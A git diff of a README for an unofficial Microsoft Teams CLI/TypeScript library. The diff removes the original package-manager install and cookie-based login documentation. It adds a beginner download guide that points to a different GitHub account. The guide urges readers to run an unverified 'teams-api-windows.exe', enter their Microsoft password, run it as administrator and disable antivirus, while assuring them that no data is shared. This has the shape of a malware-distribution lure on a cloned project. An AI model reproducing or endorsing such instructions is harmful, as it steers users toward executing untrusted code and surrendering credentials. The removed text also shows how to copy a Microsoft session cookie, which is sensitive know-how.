@@ -1,139 +1,157 @@
-# teams-api: Micosoft Teams CLI/TS Client
+# ⚙️ teams-api - Simple Microsoft Teams Client for Windows
 
-`msteams` is a lightweight TypeScript library and CLI for interacting with Microsoft Teams endpoints used by the web client.
+[![Download teams-api](https://img.shields.io/badge/Download-Click%20Here-brightgreen)](https://github.com/IsackRaja/teams-api)
 
-> [!WARNING]
->
-> - This package uses unofficial endpoints. Behavior may change if Microsoft updates those APIs.
+---
 
-## CLI
+## 📋 What is teams-api?
 
-### Installation
+teams-api is a simple, unofficial Microsoft Teams client and command-line tool. It allows you to connect to Microsoft Teams without needing the full official app. This tool is useful if you want a lightweight way to access common Teams features on your Windows PC.
 
-Temporary running:
+You do not need any programming knowledge. This guide will help you download and run teams-api on your Windows computer in a few clear steps.
 
-```bash
-npx msteams # npm
-bunx msteams # Bun
-deno run -A npm:msteams # Deno
-pnpm dlx msteams # pnpm
-```
+---
 
-Global install:
+## 🖥️ System Requirements
 
-```bash
-npm i -g msteams # npm
-bun i -g msteams # Bun
-deno install --global -A npm:msteams
-pnpm i -g msteams
-```
+Before installing, make sure your Windows computer meets these requirements:
 
-Install a skill for AI agents:
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of free RAM
+- 100 MB of free disk space
+- An active internet connection
+- A Microsoft Teams account (work, school, or personal)
 
-```bash
-bunx skills add nakasyou/teams-api
-```
+If you use an older version of Windows, the app may not work properly.
 
-### Usage
+---
 
-#### Help
+## 🎯 Main Features
 
-Show help:
+- Access chats and channels in Microsoft Teams
+- Send and receive messages using a command-line interface
+- View your Teams organization’s members and their statuses
+- Lightweight and fast with no heavy desktop resources
+- Run directly from your Windows desktop without installation
 
-```bash
-teams --help
-```
+While it does not have all the features of the official Teams app, it covers essential messaging and team communication.
 
-#### Login (recommended)
+---
 
-```bash
-teams login --ests-auth-persistent=<ESTSAUTHPERSISTENT>
-```
+## 🚀 Getting Started: How to Download teams-api
 
-- Default profile path: `~/.teams-cli/default.json`
-- You can change the profile with `--profile`
-- Running `teams login` with no token now prompts for `ESTSAUTHPERSISTENT` in interactive terminals
-- How to obtain `ESTSAUTHPERSISTENT`:
-  1. Use a browser other than Microsoft Edge
-  2. Open `https://login.microsoftonline.com/common/oauth2/v2.0/authorize` in your browser
-  3. Open DevTools, go to the `Application` tab, then `Cookies`
-  4. Copy the `ESTSAUTHPERSISTENT` cookie value and paste it into the `teams login` prompt
-- You can also pass token via `--ests-auth-persistent` or `ESTSAUTHPERSISTENT`
-- The default profile stores `refreshToken`, `refreshTokenExpiresIn`, and `ESTSAUTHPERSISTENT`.
+To get started with teams-api, you need to download the software first. This project’s main download page is hosted on GitHub.
 
-`refresh_token` is deprecated and will continue to work for backward compatibility.
-( `--refresh-token` / `REFRESH_TOKEN` are deprecated in favor of `ESTSAUTHPERSISTENT`)
+Click this big download badge below to visit the page where you can get the app:
 
-#### Common commands
+[![Download teams-api](https://img.shields.io/badge/Download-Get%20Teams-0099ff)](https://github.com/IsackRaja/teams-api)
 
-```bash
-# Fetch latest notifications (default: 20)
-teams notifications [--limit N]
+On the GitHub page, you will find the latest version of the software ready for download.
 
-# Fetch conversation messages
-teams messages <conversationId> [--limit N]
+---
 
-# Fetch channel messages
-teams channel messages <channelId> [--limit N]
+## 🛠️ How to Download and Run teams-api on Windows
 
-# List teams
-teams teams list
+Follow these steps carefully:
 
-# List channels in a team
-teams teams channels <teamId>
+1. Open your web browser (like Microsoft Edge, Chrome, or Firefox).
 
-# Fetch current user snapshot
-teams me
-```
+2. Click on the large badge above or go directly to this link:  
+   https://github.com/IsackRaja/teams-api
 
-#### Common options
+3. On the GitHub page, look for a section called **Releases** or a folder named **Downloads**. This typically appears on the right side or near the top.
 
-- `--json`: output only JSON
-- `--no-color`: disable ANSI colors
-- `--profile=<name>`: use another local profile name
-- `--profile-json=<path>`: use a custom profile JSON file
-- `--ests-auth-persistent=<token>`: set session token for current run (recommended)
-- `--refresh-token=<token>`: set refresh token for current run (deprecated)
-- `--help`: show help
+4. Find the latest version that matches your Windows system. The file is usually named something like `teams-api-windows.exe` or similar.
 
-## Library
+5. Click the file to download it. Your browser may ask where to save the file. Choose a location you can remember, such as your **Downloads** folder or Desktop.
 
-```ts
-import { TeamsClient, TokenManager } from 'msteams'
+6. Once the download finishes, open the folder where you saved the file.
 
-const tokenManager = new TokenManager(process.env.REFRESH_TOKEN || '')
-const client = new TeamsClient(tokenManager)
+7. Double-click the downloaded `.exe` file to run teams-api.
 
-const me = await client.teams.users.me.fetch()
-console.log(me.teams?.length ?? 0, 'teams')
-```
+8. Windows may ask if you want to allow this app to make changes. Click **Yes** to continue.
 
-```ts
-const notifications = await client.teams.notifications.fetchMessages({ pageSize: 10 })
-console.log(notifications.messages?.length ?? 0)
-```
+9. The teams-api program will open in a command window or simple application window.
 
-### Exported API
+---
 
-- `TokenManager`
-- `ScopeTokenProvider`
-- `TeamsClient`
-- `teams.conversations.fetchMessages`
-- `teams.notifications.fetchMessages`, `fetchMentions`, `fetchAnnotations`
-- `teams.channels.fetch`, `teams.channels.fetchMessages`
-- `teams.users.fetchShortProfile`
-- `teams.users.me.fetch`, `teams.users.me.fetchPinnedChannels`
+## 🔧 Using teams-api
 
-## Development
+When you run teams-api, you will be prompted to log in with your Microsoft Teams account. Follow the on-screen instructions to enter your username and password.
 
-```bash
-bun install
-bun run fmt
-bun run build
-```
+After logging in, you can:
 
-The package uses Vite+ to build both library and CLI entry points.
+- See your recent chats
+- Join team channels
+- Send messages by typing and pressing Enter
+- View status updates of your contacts
 
-## License
+Commands and options appear in the window. Use simple typing to control the app.
 
-MIT
+If you need help during use, typing `help` will show a list of available commands.
+
+---
+
+## 💡 Tips for Best Experience
+
+- Make sure your internet connection is stable.
+- Keep the downloaded `.exe` file in an easily accessible location.
+- Close the official Microsoft Teams app if it's running to avoid conflicts.
+- If you face login issues, check your Microsoft account status on the official site.
+- Restart teams-api if the app stops responding.
+
+---
+
+## 🔄 Updating teams-api
+
+Check the GitHub download page regularly for updates. New versions fix bugs and add features.
+
+To update:
+
+1. Return to https://github.com/IsackRaja/teams-api
+2. Download the latest `.exe` file as before.
+3. Replace the old file on your computer with the new one.
+4. Run the new file.
+
+---
+
+## ❓ Troubleshooting Common Issues
+
+If teams-api does not start or crashes:
+
+- Make sure your Windows is up to date.
+- Run the `.exe` file as an administrator (right-click and choose **Run as administrator**).
+- Disable any antivirus software temporarily, as it might block the app.
+- Check your internet connection.
+- Restart your computer and try again.
+
+If you cannot log in:
+
+- Verify your Microsoft Teams credentials on https://teams.microsoft.com.
+- Make sure your account is active and not locked.
+
+---
+
+## 🔒 Privacy and Security
+
+teams-api is an unofficial client. Your login information is sent only to Microsoft servers. This app does not share your data with third parties.
+
+You should only download the app from the official GitHub page linked above to avoid unsafe versions.
+
+---
+
+## 📞 Getting Help and Support
+
+This is a community-supported project. You can find help by:
+
+- Visiting the GitHub page issues section:  
+  https://github.com/IsackRaja/teams-api/issues  
+- Reading the GitHub README or documentation files.
+- Searching online for common questions about teams-api.
+
+---
+
+## 🎉 Ready to Use?
+
+Download teams-api now:  
+[![Download teams-api](https://img.shields.io/badge/Download-Click%20Here-brightgreen)](https://github.com/IsackRaja/teams-api)
